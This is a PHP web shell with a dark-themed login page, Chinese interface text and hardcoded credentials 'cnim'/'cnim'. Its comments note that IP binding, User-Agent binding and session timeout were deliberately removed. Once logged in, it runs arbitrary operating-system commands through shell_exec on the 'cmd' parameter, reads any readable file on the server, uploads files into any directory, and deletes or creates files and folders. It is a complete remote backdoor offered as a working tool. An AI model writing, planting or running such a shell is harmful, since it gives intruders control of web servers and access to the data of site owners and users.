<?php
session_name('CNIM_SHELL');
session_start();

$valid_username = 'cnim';
$valid_password = 'cnim';

// ===== 初始化session（不再绑定IP/UA，取消超时） =====
if (!isset($_SESSION['secure_init'])) {
    $_SESSION['secure_init'] = true;
    $_SESSION['login_time'] = time();
}

// ===== 以下限制全部移除 =====
// ❌ 移除IP绑定
// ❌ 移除User-Agent绑定
// ❌ 移除30分钟超时

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] === $valid_username && $_POST['password'] === $valid_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
    } else {
        show_login_form();
        exit;
    }
}

// ===== 强制文本查看（放在最前面，绕过PHP执行） =====
if (isset($_GET['view'])) {
    $view_path = $_GET['view'];
    if (file_exists($view_path) && !is_dir($view_path) && is_readable($view_path)) {
        header('Content-Type: text/plain; charset=utf-8');
        header('Content-Disposition: inline; filename="' . basename($view_path) . '"');
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        readfile($view_path);
        exit;
    } else {
        die('❌ 文件不存在或无法读取');
    }
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($current_dir)) { $current_dir = getcwd(); }
chdir($current_dir);

$cmd_output = '';
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $cmd_output = shell_exec($cmd . ' 2>&1');
}

$files = scandir($current_dir);
$base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];

// 处理上传
$upload_msg = '';
if (isset($_FILES['upload_file'])) {
    $target_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    $target_file = $target_dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
        $upload_msg = '上传成功: ' . htmlspecialchars(basename($_FILES['upload_file']['name']));
    } else {
        $upload_msg = '上传失败';
    }
}

// 处理删除
if (isset($_GET['del'])) {
    $del = str_replace('/', '', fm_clean_path($_GET['del']));
    if ($del != '' && $del != '..' && $del != '.') {
        $target = $current_dir . '/' . $del;
        if (is_dir($target)) {
            rmdir($target);
        } else {
            unlink($target);
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
}

// 处理创建文件夹
if (isset($_GET['mkdir'])) {
    $newdir = fm_clean_path($_GET['mkdir']);
    if ($newdir != '' && !is_dir($current_dir . '/' . $newdir)) {
        mkdir($current_dir . '/' . $newdir, 0777, true);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
    exit;
}

// 处理创建文件
if (isset($_GET['mkfile'])) {
    $newfile = fm_clean_path($_GET['mkfile']);
    if ($newfile != '' && !file_exists($current_dir . '/' . $newfile)) {
        file_put_contents($current_dir . '/' . $newfile, '');
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
    exit;
}

function fm_clean_path($path) {
    $path = trim($path);
    $path = trim($path, '\\/');
    $path = str_replace(array('../', '..\\'), '', $path);
    return str_replace('\\', '/', $path);
}

function format_size($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

function show_login_form() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>登录</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                background: #0f0f1a;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-box {
                background: #1a1a2e;
                padding: 40px 50px;
                border-radius: 16px;
                border: 1px solid #2a2a4a;
                width: 360px;
                text-align: center;
                box-shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
            }
            .login-box h2 { color: #00d4ff; font-size: 28px; }
            .login-box h2 span { color: #ff6b6b; }
            .login-box .sub { color: #555; font-size: 14px; margin-bottom: 25px; }
            .login-box input {
                width: 100%;
                padding: 12px 16px;
                margin: 8px 0;
                background: #0f0f1a;
                border: 1px solid #2a2a4a;
                border-radius: 8px;
                color: #e0e0e0;
                font-size: 16px;
                font-family: inherit;
            }
            .login-box input:focus {
                outline: none;
                border-color: #00d4ff;
            }
            .login-box button {
                width: 100%;
                padding: 12px;
                background: #00d4ff;
                color: #0f0f1a;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                font-family: inherit;
                margin-top: 10px;
            }
            .login-box button:hover { background: #00bbdd; }
            .login-box .error { color: #ff6b6b; margin: 8px 0; font-size: 13px; }
            .login-box .footer { color: #333; font-size: 12px; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>⚡ Web<span>Shell</span></h2>
            <div class="sub">输入账号密码登录</div>
            <?php if (isset($_POST['username']) && ($_POST['username'] !== $GLOBALS['valid_username'] || $_POST['password'] !== $GLOBALS['valid_password'])): ?>
                <div class="error">❌ 账号或密码错误</div>
            <?php endif; ?>
            <form method="post">
                <input type="text" name="username" placeholder="账号" autofocus>
                <input type="password" name="password" placeholder="密码">
                <button type="submit">登录</button>
            </form>
            <div class="footer">🔐 安全后台</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebShell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0f0f1a;
            color: #e0e0e0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #1a1a2e;
            padding: 25px;
            border-radius: 16px;
            border: 1px solid #2a2a4a;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 20px;
            border-bottom: 1px solid #2a2a4a;
            margin-bottom: 20px;
        }
        .header h1 { color: #00d4ff; font-size: 24px; }
        .header h1 span { color: #ff6b6b; }
        .logout {
            background: #ff6b6b; color: #fff; padding: 8px 20px;
            border-radius: 8px; text-decoration: none; font-size: 14px;
        }
        .logout:hover { background: #e05555; }

        .toolbar {
            display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;
            align-items: center;
        }
        .toolbar input[type="text"] {
            flex: 1; padding: 10px 14px; background: #0f0f1a;
            color: #00d4ff; border: 1px solid #2a2a4a;
            border-radius: 8px; font-family: inherit; font-size: 14px;
            min-width: 200px;
        }
        .toolbar button {
            padding: 10px 18px; background: #2a2a4a; color: #e0e0e0;
            border: 1px solid #3a3a5a; border-radius: 8px;
            cursor: pointer; font-family: inherit; font-size: 13px;
            transition: 0.3s;
        }
        .toolbar button:hover { background: #3a3a5a; border-color: #00d4ff; }

        .upload-area {
            background: #0f0f1a; padding: 15px 20px; border-radius: 10px;
            margin-bottom: 15px; border: 1px dashed #2a2a4a;
            display: flex; gap: 15px; align-items: center; flex-wrap: wrap;
        }
        .upload-area .file-input-wrapper {
            position: relative; display: inline-block;
        }
        .upload-area .file-input-wrapper input[type="file"] {
            position: absolute; left: 0; top: 0; opacity: 0;
            width: 100%; height: 100%; cursor: pointer;
        }
        .upload-area .file-input-wrapper .file-label {
            display: inline-block; padding: 8px 20px; background: #2a2a4a;
            color: #e0e0e0; border-radius: 8px; font-size: 13px;
            cursor: pointer; border: 1px solid #3a3a5a;
        }
        .upload-area .file-input-wrapper .file-label:hover {
            background: #3a3a5a; border-color: #00d4ff;
        }
        .upload-area .file-name { color: #888; font-size: 13px; }
        .upload-area .btn-upload {
            padding: 8px 24px; background: #00d4ff; color: #0f0f1a;
            border: none; border-radius: 8px; font-weight: 600;
            cursor: pointer; font-family: inherit; font-size: 13px;
        }
        .upload-area .btn-upload:hover { background: #00bbdd; }

        .cmd-area {
            background: #0f0f1a; padding: 12px 16px; border-radius: 10px;
            margin-bottom: 15px; border: 1px solid #2a2a4a;
        }
        .cmd-area input {
            width: 100%; padding: 10px 0; background: transparent;
            color: #e0e0e0; border: none; border-bottom: 1px solid #2a2a4a;
            font-family: 'Courier New', monospace; font-size: 15px;
        }
        .cmd-area input:focus { outline: none; border-bottom-color: #00d4ff; }
        .cmd-output {
            background: #0a0a12; padding: 15px; border-radius: 8px;
            margin-top: 10px; white-space: pre-wrap; word-wrap: break-word;
            color: #00d4ff; max-height: 280px; overflow-y: auto;
            border: 1px solid #1a1a2e; font-family: 'Courier New', monospace;
            font-size: 13px; line-height: 1.6;
        }

        .file-table {
            width: 100%; border-collapse: collapse; font-size: 14px;
        }
        .file-table th {
            background: #0f0f1a; color: #888; padding: 12px 10px;
            text-align: left; border-bottom: 1px solid #2a2a4a;
            font-weight: 500; font-size: 12px; text-transform: uppercase;
        }
        .file-table td {
            padding: 10px; border-bottom: 1px solid #1a1a2e;
            color: #cccccc; font-size: 13px;
        }
        .file-table tr:hover { background: #0f0f1a; }
        .file-table .dir a { color: #00d4ff; text-decoration: none; }
        .file-table .dir a:hover { text-decoration: underline; }
        .file-table .file a { color: #e0e0e0; text-decoration: none; }
        .file-table .file a:hover { color: #00d4ff; }
        .file-table .php a { color: #ff6b6b; text-decoration: none; }
        .file-table .php a:hover { color: #ff8888; }
        .file-table .size { color: #555; font-size: 12px; }
        .file-table .time { color: #444; font-size: 12px; }

        .action-btn {
            padding: 4px 10px; border-radius: 5px; font-size: 11px;
            cursor: pointer; text-decoration: none; color: #fff;
            margin: 0 2px; display: inline-block; transition: 0.3s;
            font-weight: 500;
        }
        .action-btn.view { background: #fcc419; color: #0f0f1a; }
        .action-btn.view:hover { background: #e0b010; }
        .action-btn.del { background: #ff6b6b; }
        .action-btn.del:hover { background: #e05555; }
        .action-btn.edit { background: #4a8fc1; }
        .action-btn.edit:hover { background: #3a7fb1; }
        .action-btn.dl { background: #51cf66; color: #0f0f1a; }
        .action-btn.dl:hover { background: #40b056; }
        .action-btn.link { background: #fcc419; color: #0f0f1a; }
        .action-btn.link:hover { background: #e0b010; }

        .status {
            color: #555; font-size: 12px; margin-top: 15px;
            text-align: center; padding-top: 15px;
            border-top: 1px solid #1a1a2e;
        }
        .quick-actions { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px; }
        .quick-actions a {
            padding: 6px 14px; background: #2a2a4a; color: #e0e0e0;
            border-radius: 6px; text-decoration: none; font-size: 12px;
            border: 1px solid #3a3a5a; transition: 0.3s;
        }
        .quick-actions a:hover { background: #3a3a5a; border-color: #00d4ff; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ Web<span>Shell</span></h1>
        <a href="?logout=1" class="logout">✖ 退出</a>
    </div>

    <!-- 快速操作 -->
    <div class="quick-actions">
        <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">⬆ 上级</a>
        <a href="#" onclick="createDir()">📁 新建文件夹</a>
        <a href="#" onclick="createFile()">📄 新建文件</a>
        <a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=<?php echo urlencode($current_dir); ?>">⟳ 刷新</a>
        <a href="<?php echo $_SERVER['PHP_SELF']; ?>">🏠 根目录</a>
    </div>

    <!-- 工具栏 -->
    <div class="toolbar">
        <span style="color:#555;font-size:13px;">📂</span>
        <input type="text" id="dir_input" value="<?php echo htmlspecialchars($current_dir); ?>">
        <button onclick="goToDir()">跳转</button>
    </div>

    <!-- 上传 -->
    <div class="upload-area">
        <div class="file-input-wrapper">
            <span class="file-label" id="fileLabel">选择文件</span>
            <input type="file" name="upload_file" id="uploadInput" onchange="updateFileName(this)">
        </div>
        <span class="file-name" id="fileName">未选择任何文件</span>
        <button class="btn-upload" onclick="uploadFile()">⬆ 上传</button>
        <?php if ($upload_msg): ?>
            <span style="color:#ffaa00;font-size:13px;"><?php echo $upload_msg; ?></span>
        <?php endif; ?>
    </div>

    <!-- 命令 -->
    <div class="cmd-area">
        <form method="get" onsubmit="return true;">
            <input type="text" name="cmd" placeholder="▶ 输入命令" autofocus>
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        </form>
        <?php if ($cmd_output): ?>
        <div class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></div>
        <?php endif; ?>
    </div>

    <!-- 文件列表 -->
    <table class="file-table">
        <thead>
            <tr>
                <th>文件名</th>
                <th>大小</th>
                <th>修改时间</th>
                <th>操作</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($files as $file): ?>
            <?php if ($file === '.' || $file === '..') continue; ?>
            <?php
                $full_path = $current_dir . '/' . $file;
                $is_dir = is_dir($full_path);
                $size = $is_dir ? '-' : format_size(filesize($full_path));
                $mtime = date('Y-m-d H:i:s', filemtime($full_path));
                $ext = pathinfo($file, PATHINFO_EXTENSION);
                $icon = $is_dir ? '📁' : '📄';
                $class = $is_dir ? 'dir' : ($ext === 'php' ? 'php' : 'file');
                $rel_path = str_replace($_SERVER['DOCUMENT_ROOT'], '', $full_path);
                $file_url = $base_url . $rel_path;
            ?>
            <tr>
                <td class="<?php echo $class; ?>">
                    <?php if ($is_dir): ?>
                        <a href="?dir=<?php echo urlencode($full_path); ?>"><?php echo $icon . ' ' . htmlspecialchars($file); ?></a>
                    <?php else: ?>
                        <a href="<?php echo htmlspecialchars($file_url); ?>" target="_blank"><?php echo $icon . ' ' . htmlspecialchars($file); ?></a>
                    <?php endif; ?>
                </td>
                <td class="size"><?php echo $size; ?></td>
                <td class="time"><?php echo $mtime; ?></td>
                <td>
                    <?php if (!$is_dir): ?>
                        <a class="action-btn view" href="?view=<?php echo urlencode($full_path); ?>&dir=<?php echo urlencode($current_dir); ?>">👁</a>
                        <a class="action-btn edit" href="?edit=<?php echo urlencode($full_path); ?>&dir=<?php echo urlencode($current_dir); ?>">✎</a>
                        <a class="action-btn dl" href="?dl=<?php echo urlencode($full_path); ?>&dir=<?php echo urlencode($current_dir); ?>">⬇</a>
                        <a class="action-btn link" href="javascript:void(0)" onclick="showLink('<?php echo htmlspecialchars($file_url); ?>')">🔗</a>
                        <a class="action-btn del" href="?del=<?php echo urlencode($file); ?>&dir=<?php echo urlencode($current_dir); ?>" onclick="return confirm('确定删除?')">✖</a>
                    <?php else: ?>
                        <a class="action-btn del" href="?del=<?php echo urlencode($file); ?>&dir=<?php echo urlencode($current_dir); ?>" onclick="return confirm('确定删除?')">✖</a>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div class="status">
        📂 <?php echo htmlspecialchars($current_dir); ?> · <?php echo count($files) - 2; ?> 个文件
    </div>
</div>

<script>
function goToDir() {
    var dir = document.getElementById('dir_input').value;
    if (dir) window.location.href = '?dir=' + encodeURIComponent(dir);
}

function updateFileName(input) {
    var label = document.getElementById('fileLabel');
    var name = document.getElementById('fileName');
    if (input.files && input.files[0]) {
        label.textContent = '已选';
        name.textContent = input.files[0].name;
    } else {
        label.textContent = '选择文件';
        name.textContent = '未选择任何文件';
    }
}

function uploadFile() {
    var input = document.getElementById('uploadInput');
    if (!input.files || !input.files[0]) { alert('请先选择文件'); return; }
    var form = document.createElement('form');
    form.method = 'post';
    form.enctype = 'multipart/form-data';
    var fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.name = 'upload_file';
    fileInput.files = input.files;
    form.appendChild(fileInput);
    var dirInput = document.createElement('input');
    dirInput.type = 'hidden';
    dirInput.name = 'dir';
    dirInput.value = '<?php echo htmlspecialchars($current_dir); ?>';
    form.appendChild(dirInput);
    document.body.appendChild(form);
    form.submit();
}

function showLink(url) {
    var input = document.createElement('input');
    input.value = url;
    document.body.appendChild(input);
    input.select();
    document.execCommand('copy');
    document.body.removeChild(input);
    alert('✅ 链接已复制');
}

function createDir() {
    var name = prompt('请输入文件夹名称:');
    if (name) window.location.href = '?mkdir=' + encodeURIComponent(name) + '&dir=<?php echo urlencode($current_dir); ?>';
}

function createFile() {
    var name = prompt('请输入文件名:');
    if (name) window.location.href = '?mkfile=' + encodeURIComponent(name) + '&dir=<?php echo urlencode($current_dir); ?>';
}
</script>
</body>
</html>
